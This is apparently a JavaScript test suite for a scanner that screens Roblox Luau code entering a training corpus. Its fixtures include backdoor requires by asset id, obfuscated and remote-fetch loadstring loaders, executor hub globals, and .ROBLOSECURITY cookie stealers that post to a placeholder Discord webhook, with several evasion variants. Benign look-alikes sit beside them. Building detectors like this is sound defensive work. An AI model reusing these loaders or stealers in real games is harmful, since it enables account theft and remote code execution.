// Tests for the §4 security gate — the most safety-critical module in the intake pipeline, and
// the one whose failure mode is not "a bug" but "an exploit loader in the training corpus".
//
// HALF THIS FILE IS FALSE POSITIVES, ON PURPOSE. A scanner that catches every loader and also
// condemns a legitimate analytics call is a scanner someone switches off inside a week, and a
// switched-off scanner is worse than no scanner because it also carries a false assurance. So the
// three benign fixtures the brief names — an analytics HTTP call, a long base64 image string in a
// UI module, and `require(script.Parent.Foo)` — are asserted safe as strictly as the loaders are
// asserted unsafe, and two more (a legitimate networking module, an anti-cheat repository that
// documents the attacks it blocks) are pinned beside them because they are the two false positives
// this design most plausibly produces.
//
// The thresholds are pinned too. A threshold that can drift silently is a threshold that will, and
// every one of them is a judgement call written down in SCAN_LIMITS with its reason.
//
// NO NETWORK: asserted structurally at the bottom — the module has no imports at all.
//
// Run: node --test packages/corpus/src/intake/security.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { scan, scanTree, worstSeverity, SCAN_LIMITS, SECURITY_CLASSES } from './security.mjs';

const kinds = (v) => v.signals.map((s) => s.kind);
const highs = (v) => v.signals.filter((s) => s.severity === 'high').map((s) => s.kind);

// ================================================================================================
// Fixtures — the seven the brief names, plus the two extra false positives worth pinning.
// ================================================================================================

/** A clean simulator module: datastore, currency, a shop purchase. Nothing to say about it. */
const CLEAN_SIMULATOR = `
local DataStoreService = game:GetService("DataStoreService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Config = require(script.Parent.Config)
local store = DataStoreService:GetDataStore("PlayerCoins_v3")

local Coins = {}
Coins.__index = Coins

function Coins.new(player)
	local self = setmetatable({ player = player, amount = 0 }, Coins)
	local ok, saved = pcall(function()
		return store:GetAsync("player_" .. player.UserId)
	end)
	if ok and typeof(saved) == "number" then
		self.amount = saved
	end
	return self
end

function Coins:award(n)
	self.amount += n
	self.player:SetAttribute("Coins", self.amount)
end

function Coins:buy(itemId)
	local item = Config.Shop[itemId]
	if not item or self.amount < item.price then
		return false, "not enough coins"
	end
	self.amount -= item.price
	self.player:SetAttribute("Coins", self.amount)
	return true
end

Players.PlayerRemoving:Connect(function(player)
	pcall(function()
		store:SetAsync("player_" .. player.UserId, player:GetAttribute("Coins") or 0)
	end)
end)

return Coins
`;

/** A plain LocalScript. Ordinary UI wiring; the corpus is mostly this. */
const PLAIN_SCRIPT = `
local player = game:GetService("Players").LocalPlayer
local gui = player:WaitForChild("PlayerGui"):WaitForChild("ShopGui")

gui.Frame.BuyButton.Activated:Connect(function()
	gui.Frame.BuyButton.Text = "Buying..."
	task.wait(0.25)
	gui.Frame.BuyButton.Text = "Buy"
end)
`;

/** The marketplace backdoor: a module pulled off the catalogue by id at runtime. */
const REQUIRE_BY_ID_BACKDOOR = `
local ok = pcall(function()
	require(4623459072)()
end)
if not ok then
	require(tonumber("73215698"))()
end
`;

/** An obfuscated loader: escaped text, a packed line, and a loadstring to run the result. */
const OBFUSCATED_LOADER =
  String.raw`local s = "\x6c\x6f\x63\x61\x6c\x20\x78\x3d\x31\x3b\x20\x77\x68\x69\x6c\x65\x20\x74\x72\x75\x65\x20\x64\x6f\x20\x78\x3d\x78\x2b\x31\x20\x65\x6e\x64\x20\x72\x65\x74\x75\x72\x6e\x20\x78"` +
  '\nlocal blob = "' +
  'A1b2C3d4'.repeat(300) +
  '"\nloadstring(s)()\n';

/** Escaped text with no loader vocabulary at all — shape alone must be enough. */
const ESCAPED_SHAPE_ONLY = String.raw`return "\x48\x65\x6c\x6c\x6f\x20\x74\x68\x65\x72\x65\x20\x66\x72\x69\x65\x6e\x64\x20\x74\x68\x69\x73\x20\x69\x73\x20\x6e\x6f\x74\x20\x74\x65\x78\x74"`;

/** The remote-payload loader §4 names: fetch a script over HTTP, then run it. */
const HTTPGET_LOADSTRING = `
local url = "https://raw.githubusercontent.com/somebody/hub/main/main.lua"
loadstring(game:HttpGet(url))()
`;

/** The same shape built out of the real Roblox API — HttpService is fine, HttpService feeding
 *  loadstring is not, and this fixture exists to prove the pair is caught without `game:HttpGet`. */
const HTTPSERVICE_LOADSTRING = `
local HttpService = game:GetService("HttpService")
local payload = HttpService:GetAsync("https://example.com/stage2")
loadstring(payload)()
`;

/** A cookie stealer: session token out through a webhook. */
const ROBLOSECURITY_STEALER = `
local HttpService = game:GetService("HttpService")
local cookie = game:GetService("CoreGui"):GetSecret(".ROBLOSECURITY")
HttpService:PostAsync(
	"https://discord.com/api/webhooks/1122334455/abcdef",
	HttpService:JSONEncode({ content = cookie })
)
`;

/** A script hub: executor-only globals and a menu of cheats. */
const EXECUTOR_HUB = `
local Rayfield = getgenv().Rayfield
local old
old = hookmetamethod(game, "__namecall", function(self, ...)
	return old(self, ...)
end)

-- Aimbot + ESP toggles
getgenv().Aimbot = true
getgenv().ESP = true
`;

// ---- the false positives ----------------------------------------------------------------------

/** FALSE POSITIVE #1: a legitimate analytics call. HttpService is the ordinary furniture. */
const LEGIT_ANALYTICS = `
local HttpService = game:GetService("HttpService")
local ENDPOINT = "https://analytics.example.com/v1/events"

local Analytics = {}

function Analytics.track(name, props)
	local body = HttpService:JSONEncode({ event = name, props = props, at = os.time() })
	local ok, err = pcall(function()
		return HttpService:PostAsync(ENDPOINT, body, Enum.HttpContentType.ApplicationJson)
	end)
	if not ok then
		warn("analytics failed: " .. tostring(err))
	end
end

return Analytics
`;

/** FALSE POSITIVE #2: an icon embedded as base64 in a UI module. Long line AND blob — two
 *  mediums, which must not add up to a verdict. */
const LEGIT_BASE64_ICON = `
local Icons = {}

Icons.CoinPng = "${'A1b2C3d4'.repeat(80)}"

function Icons.apply(imageLabel, name)
	imageLabel.Image = "rbxassetid://" .. tostring(Icons[name])
end

return Icons
`;

/** FALSE POSITIVE #3: ordinary path requires, which are how every Roblox codebase is assembled. */
const LEGIT_REQUIRES = `
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Config = require(script.Parent.Config)
local Shop = require(script.Parent.Modules.Shop)
local Signal = require(ReplicatedStorage.Packages.Signal)
local Promise = require(ReplicatedStorage:WaitForChild("Packages").Promise)

return { Config = Config, Shop = Shop, Signal = Signal, Promise = Promise }
`;

/** FALSE POSITIVE #4: a networking module. Creates remotes at startup, fires them from elsewhere. */
const LEGIT_NETWORKING = `
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local folder = Instance.new("Folder")
folder.Name = "Remotes"
folder.Parent = ReplicatedStorage

local Remotes = {}
for _, name in ipairs({ "Buy", "Equip", "Rebirth" }) do
	local event = Instance.new("RemoteEvent")
	event.Name = name
	event.Parent = folder
	Remotes[name] = event
end

local Net = {}

function Net.buy(itemId)
	Remotes.Buy:FireServer(itemId)
end

function Net.rebirth()
	Remotes.Rebirth:FireServer()
end

return Net
`;

/** The phone-home remote: minted and fired with identity in the same breath. */
const PHONE_HOME_REMOTE = `
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local beacon = Instance.new("RemoteEvent")
beacon.Name = "Telemetry"
beacon.Parent = ReplicatedStorage
beacon:FireServer(Players.LocalPlayer.UserId, Players.LocalPlayer.DisplayName)
`;

// ================================================================================================
// The seven fixtures the brief names.
// ================================================================================================

test('a clean simulator module is safe, with nothing worth a reviewer even looking at', () => {
  const v = scan({ path: 'src/Coins.luau', source: CLEAN_SIMULATOR });
  assert.equal(v.safe, true);
  assert.equal(v.class, null);
  assert.deepEqual(highs(v), []);
  // GetAsync/SetAsync are DataStore calls; they are recorded at low and change nothing.
  assert.ok(v.signals.every((s) => s.severity === 'low'), `unexpected signals: ${JSON.stringify(kinds(v))}`);
});

test('a plain script is safe and produces no signals at all', () => {
  const v = scan({ path: 'src/ShopGui.client.luau', source: PLAIN_SCRIPT });
  assert.equal(v.safe, true);
  assert.deepEqual(v.signals, []);
  assert.match(v.reason, /no exploit, loader, credential or obfuscation signal/);
});

test('require(<numeric literal>) is a backdoor, and is high on its own', () => {
  const v = scan({ path: 'ServerScriptService/Init.server.luau', source: REQUIRE_BY_ID_BACKDOOR });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'backdoor');
  assert.ok(highs(v).includes('require-asset-id'));
  // Both forms: the bare literal and the one laundered through tonumber().
  assert.equal(v.signals.filter((s) => s.kind === 'require-asset-id').length, 2);
  const lead = v.signals.find((s) => s.kind === 'require-asset-id');
  assert.equal(typeof lead.line, 'number');
  assert.match(lead.excerpt, /require\(/);
});

test('an obfuscated loader is caught by shape, and named an obfuscated-loader', () => {
  const v = scan({ path: 'hub/loader.lua', source: OBFUSCATED_LOADER });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'obfuscated-loader');
  assert.ok(highs(v).includes('packed-line'));
  assert.ok(kinds(v).includes('encoded-blob'));
});

test('escaped text alone condemns a file — shape needs no vocabulary to work', () => {
  const v = scan({ path: 'hub/enc.lua', source: ESCAPED_SHAPE_ONLY });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'obfuscated-loader');
  assert.deepEqual(highs(v), ['escape-density']);
});

test('HttpGet + loadstring is a remote-payload loader', () => {
  const v = scan({ path: 'hub/main.lua', source: HTTPGET_LOADSTRING });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'remote-payload-loader');
  assert.ok(highs(v).includes('remote-payload-fetch'));
  assert.ok(highs(v).includes('dynamic-code'), 'loadstring must be promoted by its partner');
  assert.match(v.reason, /payload fetched over HTTP|remote-payload loader/);
});

test('the same loader built on the real HttpService API is caught too — the pair is the signal', () => {
  const v = scan({ path: 'hub/stage1.lua', source: HTTPSERVICE_LOADSTRING });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'remote-payload-loader');
  // Neither half is high by itself; the combination is what condemns.
  assert.ok(highs(v).includes('http-call'));
  assert.ok(highs(v).includes('dynamic-code'));
});

test('.ROBLOSECURITY handling is credential theft', () => {
  const v = scan({ path: 'hub/steal.lua', source: ROBLOSECURITY_STEALER });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'credential-theft');
  assert.ok(highs(v).includes('credential-access'));
  // The webhook is only a medium on its own; beside a cookie it is promoted.
  assert.ok(highs(v).includes('exfiltration-endpoint'));
});

test('an executor script hub is caught by globals that cannot exist in the Roblox sandbox', () => {
  const v = scan({ path: 'hub/universal.lua', source: EXECUTOR_HUB });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'executor');
  assert.ok(highs(v).includes('executor-global'));
  assert.match(v.reason, /executor/);
});

// ================================================================================================
//[[ A function of one's own called `httpGet`. Found in the wild, and it condemned a library.
//
//   `evaera/roblox-lua-promise` is one of the most widely used packages in the Roblox
//   ecosystem. Its `docs/WhyUsePromises.md` teaches Promises by wrapping `HttpService:GetAsync`
//   in a helper, and the scanner classified the repository as an `executor` on five hits inside
//   that tutorial. The detector's own comment justifies itself with "`game:HttpGet` is an
//   executor extension" — reasoning that applies to the RECEIVER form and not to a bare
//   identifier, which is what the pattern actually matched.
//
//   Both halves are asserted: the honest helper is safe, and the executor idiom it was written
//   to catch is still caught. ]]
const LEGIT_HTTPGET_HELPER = `
local HttpService = game:GetService("HttpService")

local function httpGet(url)
	return Promise.new(function(resolve, reject)
		local ok, body = pcall(function()
			return HttpService:GetAsync(url)
		end)
		if ok then resolve(body) else reject(body) end
	end)
end

local promise = httpGet("https://google.com")
return httpGet
`;

test('a local helper named httpGet is not an executor', () => {
  const v = scan({ path: 'docs/WhyUsePromises.md', source: LEGIT_HTTPGET_HELPER });
  assert.equal(v.safe, true, `condemned as ${v.class}: ${v.reason}`);
});

test('but the receiver form it was written to catch still is', () => {
  const v = scan({ path: 'hub/main.lua', source: 'loadstring(game:HttpGet("https://x.tld/a.lua"))()' });
  assert.equal(v.safe, false);
  //[[ `remote-payload-loader`, not `executor`, and the difference is the point of
  //   SECURITY_CLASSES being ordered "by SPECIFICITY, not by badness". Both detectors fire —
  //   the fetch AND the loadstring — so the class chosen is the pair, which tells a reviewer
  //   what the file DOES rather than merely what family it belongs to. This assertion was
  //   written expecting `executor` and the scanner was right. ]]
  assert.equal(v.class, 'remote-payload-loader');
});

test('and any receiver, not only `game`', () => {
  const v = scan({ path: 'hub/main.lua', source: 'local g = game\nloadstring(g:HttpGet(url))()' });
  assert.equal(v.safe, false);
});

// FALSE POSITIVES. These must come back safe. They are the reason anyone leaves the scanner on.
// ================================================================================================

test('FALSE POSITIVE: a legitimate analytics HTTP call is safe', () => {
  const v = scan({ path: 'src/Analytics.luau', source: LEGIT_ANALYTICS });
  assert.equal(v.safe, true);
  assert.equal(v.class, null);
  assert.deepEqual(highs(v), []);
  // HttpService is recorded, at low, only so `loadstring` + a fetch can be recognised as a pair.
  assert.ok(kinds(v).includes('http-call'));
  assert.ok(v.signals.every((s) => s.severity === 'low'));
});

test('FALSE POSITIVE: a long base64 image string in a UI module is safe — two mediums are not a verdict', () => {
  const v = scan({ path: 'src/ui/Icons.luau', source: LEGIT_BASE64_ICON });
  assert.equal(v.safe, true);
  assert.equal(v.class, null);
  // Both mediums fire. Neither is promoted, because no PROMOTION names that pair.
  assert.ok(kinds(v).includes('encoded-blob'));
  assert.ok(kinds(v).includes('long-line'));
  assert.deepEqual(highs(v), []);
  assert.match(v.reason, /worth a reviewer's eye, none disqualifying/);
});

test('FALSE POSITIVE: require(script.Parent.Foo) is how every codebase is assembled', () => {
  const v = scan({ path: 'src/init.luau', source: LEGIT_REQUIRES });
  assert.equal(v.safe, true);
  assert.deepEqual(v.signals, []);
});

test('FALSE POSITIVE: a networking module that creates remotes and fires them elsewhere is safe', () => {
  const v = scan({ path: 'src/Net.luau', source: LEGIT_NETWORKING });
  assert.equal(v.safe, true);
  assert.ok(!kinds(v).includes('phone-home-remote'));
});

test('a remote minted and fired with player identity in the same breath is not', () => {
  const v = scan({ path: 'model/Beacon.client.luau', source: PHONE_HOME_REMOTE });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'suspicious-remote');
  const s = v.signals.find((x) => x.kind === 'phone-home-remote');
  assert.match(s.excerpt, /FireServer/);
  assert.equal(typeof s.line, 'number');
});

// ================================================================================================
// Evasions. Found by probing the scanner rather than by imagining it worked; each is paired with
// the nearest innocent code, because a rule that catches the evasion and the neighbour is not a
// rule worth having.
// ================================================================================================

test('EVASION: an asset id laundered through a variable is still a backdoor', () => {
  const v = scan({ path: 'hub/init.lua', source: 'local id = 4623459072\nrequire(id)()\n' });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'backdoor');
});

test('...but a large asset-id constant that is never required is ordinary', () => {
  const v = scan({ path: 'src/Icons.luau', source: 'local ICON = 12345678901\nlabel.Image = "rbxassetid://" .. ICON\n' });
  assert.equal(v.safe, true);
  assert.deepEqual(v.signals, []);
});

test('...and a path require sitting beside a large number is ordinary too', () => {
  const v = scan({ path: 'src/init.luau', source: 'local Cfg = require(script.Parent.Config)\nlocal MAX_COINS = 99999999\n' });
  assert.equal(v.safe, true);
  assert.deepEqual(v.signals, []);
});

test('EVASION: require(tonumber(...)) is a backdoor whatever is inside — nobody requires a number', () => {
  const v = scan({ path: 'hub/init.lua', source: 'local a = "46234"\nrequire(tonumber(a .. "59072"))()\n' });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'backdoor');
});

test('EVASION: loadstring reached by bracket index is still loadstring', () => {
  const v = scan({ path: 'hub/init.lua', source: '_G["loadstring"](game:HttpGet(url))()\n' });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'remote-payload-loader');
});

// ================================================================================================
// Calibration: what a single suspicious word is, and is not, allowed to do.
// ================================================================================================

test('one cheat word is a note, not a verdict — an anti-cheat module says "aimbot" too', () => {
  const v = scan({
    path: 'src/AntiCheat.luau',
    source: '-- Rejects the common aimbot pattern: a mouse lock that snaps to a head.\nlocal function check(p) return p end\n',
  });
  assert.equal(v.safe, true);
  assert.deepEqual(kinds(v), ['cheat-vocabulary']);
  assert.equal(v.signals[0].severity, 'medium');
});

test('two distinct cheat words in one file is a menu, and condemns', () => {
  const v = scan({ path: 'hub/menu.lua', source: '-- aimbot toggle\n-- noclip toggle\n' });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'executor');
  assert.match(v.reason, /names 2 distinct cheats/);
});

test('"ESP" is matched case-sensitively, so "response" and "especially" do not fire it', () => {
  const v = scan({ path: 'src/Http.luau', source: 'local response = nil -- especially important\nreturn response\n' });
  assert.equal(v.safe, true);
  assert.deepEqual(v.signals, []);
});

test('"Auto Farm" as a gamepass name is a note, not a verdict — simulators sell it legitimately', () => {
  const v = scan({ path: 'src/Passes.luau', source: 'local PASSES = { AutoFarm = 123, x2Coins = 456 }\nreturn PASSES\n' });
  assert.equal(v.safe, true);
  assert.deepEqual(highs(v), []);
});

test('loadstring alone is a note — plugins and command bars use it legitimately', () => {
  const v = scan({ path: 'plugin/CommandBar.luau', source: 'local fn = loadstring(box.Text)\nif fn then fn() end\n' });
  assert.equal(v.safe, true);
  assert.deepEqual(kinds(v), ['dynamic-code']);
});

test('getfenv alone is a note — legacy module loaders in this corpus really do use it', () => {
  const v = scan({ path: 'src/Legacy.luau', source: 'local env = getfenv(1)\nreturn env\n' });
  assert.equal(v.safe, true);
  assert.deepEqual(kinds(v), ['env-manipulation']);
});

test('a Discord webhook alone is a note — plenty of honest games log purchases to one', () => {
  const v = scan({
    path: 'src/PurchaseLog.luau',
    source: 'local URL = "https://discord.com/api/webhooks/1/abc"\nreturn URL\n',
  });
  assert.equal(v.safe, true);
  assert.deepEqual(kinds(v), ['exfiltration-endpoint']);
});

test('a few hundred numbers is level data; a few thousand is bytecode', () => {
  const data = Array.from({ length: 300 }, (_, i) => i % 900).join(', ');
  const note = scan({ path: 'src/Curve.luau', source: `return { ${data} }\n` });
  assert.equal(note.safe, true);
  assert.ok(kinds(note).includes('numeric-table'));

  const big = Array.from({ length: 1200 }, (_, i) => i % 900).join(', ');
  const verdict = scan({ path: 'hub/bytecode.lua', source: `return { ${big} }\n` });
  assert.equal(verdict.safe, false);
  assert.equal(verdict.class, 'obfuscated-loader');
});

// ================================================================================================
// Ambiguity, kept narrow: it means "could not be seen in full", never "contains a known string".
// ================================================================================================

test('an unreadable source is unsafe rather than clean', () => {
  const v = scan({ path: 'src/Broken.luau', source: null });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'unscannable');
  assert.match(v.reason, /could not be read in full/);
});

test('a source past the scan cap is unscannable — a partial look cannot clear a file', () => {
  const v = scan({ path: 'src/Huge.luau', source: 'local x = 1\n'.repeat(SCAN_LIMITS.maxSourceChars / 8) });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'unscannable');
});

test('scan() with no argument is unsafe, not a crash and not a pass', () => {
  const v = scan();
  assert.equal(v.safe, false);
  assert.equal(v.class, 'unscannable');
});

test('a truncated file is called unscannable even when its readable prefix trips other detectors', () => {
  // Found by running this scanner over the repo's own 694 KB generated type dump, which is past
  // the cap AND full of enormous lines: it came back class 'obfuscated-loader' with a reason that
  // said "could not be read in full". A verdict that contradicts its own explanation wastes the
  // reviewer it exists to serve.
  const line = `${'x'.repeat(SCAN_LIMITS.packedLine + 10)}\n`;
  const v = scan({ path: 'src/Generated.luau', source: line.repeat(Math.ceil(SCAN_LIMITS.maxSourceChars / line.length) + 10) });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'unscannable');
  assert.match(v.reason, /could not be read in full/);
  // The prefix findings are not discarded — they are just not allowed to name the file.
  assert.ok(kinds(v).includes('packed-line'));
});

test('a verdict never contradicts its own explanation', () => {
  for (const source of [REQUIRE_BY_ID_BACKDOOR, OBFUSCATED_LOADER, HTTPGET_LOADSTRING, HTTPSERVICE_LOADSTRING, ROBLOSECURITY_STEALER, EXECUTOR_HUB, PHONE_HOME_REMOTE]) {
    const v = scan({ path: 'x.lua', source });
    assert.ok(v.reason.startsWith(`${v.class}:`), `reason does not lead with its class: ${v.reason}`);
  }
});

// ================================================================================================
// scanTree: worst verdict wins, and signals are never combined across files.
// ================================================================================================

test('scanTree takes the worst verdict and names the file that earned it', () => {
  const v = scanTree([
    { path: 'src/Coins.luau', source: CLEAN_SIMULATOR },
    { path: 'src/Analytics.luau', source: LEGIT_ANALYTICS },
    { path: 'hub/main.lua', source: HTTPGET_LOADSTRING },
  ]);
  assert.equal(v.safe, false);
  assert.equal(v.class, 'remote-payload-loader');
  assert.match(v.reason, /1 of 3 file\(s\) disqualified/);
  assert.ok(v.signals.some((s) => s.path === 'hub/main.lua'));
});

test('scanTree is clean when every file is clean', () => {
  const v = scanTree([
    { path: 'src/Coins.luau', source: CLEAN_SIMULATOR },
    { path: 'src/init.luau', source: LEGIT_REQUIRES },
    { path: 'src/Net.luau', source: LEGIT_NETWORKING },
  ]);
  assert.equal(v.safe, true);
  assert.equal(v.class, null);
  assert.match(v.reason, /3 file\(s\) scanned/);
});

test('scanTree accepts a { path: source } map, because callers hold both shapes', () => {
  const v = scanTree({ 'src/init.luau': LEGIT_REQUIRES, 'hub/steal.lua': ROBLOSECURITY_STEALER });
  assert.equal(v.safe, false);
  assert.equal(v.class, 'credential-theft');
});

test('signals are NOT combined across files: a plugin loadstring and an analytics call stay two ordinary files', () => {
  const v = scanTree([
    { path: 'plugin/CommandBar.luau', source: 'local fn = loadstring(box.Text)\n' },
    { path: 'src/Analytics.luau', source: LEGIT_ANALYTICS },
  ]);
  assert.equal(v.safe, true, 'cross-file promotion would manufacture a loader out of two normal files');
});

test('an anti-cheat repository documenting different attacks in different modules stays safe', () => {
  const v = scanTree([
    { path: 'src/checks/Aim.luau', source: '-- detects the aimbot snap\nreturn true\n' },
    { path: 'src/checks/Movement.luau', source: '-- detects noclip through walls\nreturn true\n' },
  ]);
  assert.equal(v.safe, true, 'a cross-file cheat-word count would condemn every anti-cheat repo there is');
});

test('an empty tree is safe and says so', () => {
  const v = scanTree([]);
  assert.equal(v.safe, true);
  assert.match(v.reason, /nothing to scan/);
});

test('a tree past the file cap is unscannable rather than partially cleared', () => {
  const files = Array.from({ length: SCAN_LIMITS.maxFiles + 1 }, (_, i) => ({ path: `f${i}.luau`, source: 'return 1\n' }));
  const v = scanTree(files);
  assert.equal(v.safe, false);
  assert.equal(v.class, 'unscannable');
});

// ================================================================================================
// The shape of the contract, pinned. Other intake modules build against these field names.
// ================================================================================================

test('a verdict has exactly the SecurityVerdict shape, and signals carry kind/severity/path/excerpt/line', () => {
  const v = scan({ path: 'hub/main.lua', source: HTTPGET_LOADSTRING });
  assert.deepEqual(Object.keys(v).sort(), ['class', 'reason', 'safe', 'signals'].sort());
  for (const s of v.signals) {
    assert.deepEqual(Object.keys(s).sort(), ['excerpt', 'kind', 'line', 'path', 'severity'].sort());
    assert.ok(['low', 'medium', 'high'].includes(s.severity));
    assert.ok(s.line === null || Number.isInteger(s.line));
    assert.ok(s.excerpt.length <= SCAN_LIMITS.excerptChars);
  }
  assert.equal(v.class === null, v.safe);
});

test('a safe verdict always has a null class, and an unsafe one always names a known class', () => {
  for (const source of [CLEAN_SIMULATOR, PLAIN_SCRIPT, LEGIT_ANALYTICS, LEGIT_BASE64_ICON, LEGIT_REQUIRES, LEGIT_NETWORKING]) {
    assert.equal(scan({ path: 'x', source }).class, null);
  }
  for (const source of [REQUIRE_BY_ID_BACKDOOR, OBFUSCATED_LOADER, HTTPGET_LOADSTRING, ROBLOSECURITY_STEALER, EXECUTOR_HUB]) {
    const v = scan({ path: 'x', source });
    assert.ok(SECURITY_CLASSES.includes(v.class), `unknown class ${v.class}`);
  }
});

test('excerpts are stripped of control characters, because they land in logs and terminals', () => {
  const esc = String.fromCharCode(27) + "[31m";
  const v = scan({ path: 'hub/x.lua', source: `local a = game:HttpGet("http://x${esc}/y")` });
  const s = v.signals.find((x) => x.kind === 'remote-payload-fetch');
  assert.ok([...s.excerpt].every((ch) => ch.charCodeAt(0) >= 32), `control characters survived: ${JSON.stringify(s.excerpt)}`);
});

test('the signal list is capped and ordered worst-first, so a condemned file still leads with why', () => {
  const noisy = `${EXECUTOR_HUB}\n${ROBLOSECURITY_STEALER}\n${REQUIRE_BY_ID_BACKDOOR}\n${'-- aimbot noclip dupe wallhack ESP\n'.repeat(3)}`;
  const v = scan({ path: 'hub/everything.lua', source: noisy });
  assert.ok(v.signals.length <= SCAN_LIMITS.maxSignals);
  assert.equal(v.signals[0].severity, 'high');
  assert.equal(v.class, 'backdoor', 'the most specific answer to "what is this" wins');
});

test('thresholds are pinned — each one is a judgement call, not an accident', () => {
  assert.equal(SCAN_LIMITS.longLine, 400);
  assert.equal(SCAN_LIMITS.packedLine, 2_000);
  assert.equal(SCAN_LIMITS.minEscapes, 20);
  assert.equal(SCAN_LIMITS.escapeRatio, 0.15);
  assert.equal(SCAN_LIMITS.concatChain, 12);
  assert.equal(SCAN_LIMITS.base64Run, 160);
  assert.equal(SCAN_LIMITS.numericRun, 200);
  assert.equal(SCAN_LIMITS.numericRunHigh, 1_000);
  assert.equal(SCAN_LIMITS.charChain, 5);
  assert.equal(SCAN_LIMITS.remoteWindow, 10);
  assert.equal(SCAN_LIMITS.maxSourceChars, 500_000);
  assert.equal(SCAN_LIMITS.maxFiles, 4_000);
});

test('worstSeverity orders low < medium < high', () => {
  assert.equal(worstSeverity('low', 'medium'), 'medium');
  assert.equal(worstSeverity('high', 'medium'), 'high');
  assert.equal(worstSeverity('low', 'low'), 'low');
});

// ================================================================================================
// NO NETWORK. Asserted structurally rather than trusted: the module has no imports at all, so
// there is nothing for a future edit to quietly reach through.
// ================================================================================================

test('the module imports nothing and cannot reach the network', () => {
  const src = readFileSync(new URL('./security.mjs', import.meta.url), 'utf8');
  assert.ok(!/^\s*import\s/m.test(src), 'security.mjs must have no imports');
  assert.ok(!/\brequire\s*\(\s*['"]/.test(src), 'security.mjs must not CommonJS-require anything');
  assert.ok(!/\bfetch\s*\(/.test(src), 'security.mjs must never call fetch');
  assert.ok(!/child_process|node:http|XMLHttpRequest/.test(src));
});

// ---------------------------------------------------------------------------
// Regression: the four credential-theft disguises the adversarial pass proved
// evaded a bare literal match, plus the same-line require laundering whose
// two-line twin was already caught.
// ---------------------------------------------------------------------------

test('§4 a char-coded .ROBLOSECURITY is caught, not just the spelled-out literal', () => {
  const charCoded = 'local k = string.char(46,82,79,66,76,79,83,69,67,85,82,73,84,89)\nlocal c = getcookie(k)';
  const v = scan({ source: charCoded });
  assert.equal(v.safe, false, 'a char-coded cookie name must not read as safe');
});

test('§4 credential theft survives concatenation, reversal and hex escapes', () => {
  const cases = [
    ['concatenation', 'local k = ".ROBLO" .. "SECURITY"\nlocal c = getcookie(k)'],
    ['reversal', 'local k = string.reverse("YTIRUCESOLBOR.")\nlocal c = getcookie(k)'],
    ['hex escapes', 'local k = "\\x2eROBLOSECURITY"\nlocal c = getcookie(k)'],
  ];
  for (const [name, source] of cases) {
    const v = scan({ source });
    assert.equal(v.safe, false, `${name} disguise was not caught`);
  }
});

test('§4 the fully armed stealer is caught', () => {
  const source = [
    'local k = string.char(46,82,79,66,76,79,83,69,67,85,82,73,84,89)',
    'local cookie = getcookie(k)',
    'local hook = "https://discord.com/api/webhooks/000/aaa"',
    'game:GetService("HttpService"):PostAsync(hook, cookie)',
  ].join('\n');
  const v = scan({ source });
  assert.equal(v.safe, false, 'a char-coded cookie exfiltrated to a webhook must not read as safe');
});

test('§4 same-line require laundering is caught, like its two-line twin', () => {
  const oneLine = scan({ source: 'local id = 4623459072; require(id)' });
  const twoLine = scan({ source: 'local id = 4623459072\nrequire(id)' });
  assert.equal(twoLine.safe, false, 'the two-line form was already expected to fail');
  assert.equal(oneLine.safe, false, 'a semicolon must not be enough to evade the scanner');
});

test('§4 decoding does not manufacture findings in honest code', () => {
  // A legitimate module that uses string.char and concatenation for real work.
  const honest = [
    'local function pad(n) return string.char(32) .. tostring(n) end',
    'local label = "SHARDS" .. ": " .. "0"',
    'return { pad = pad, label = label }',
  ].join('\n');
  const v = scan({ source: honest });
  assert.equal(v.safe, true, `decoding produced a false positive: ${v.reason}`);
});
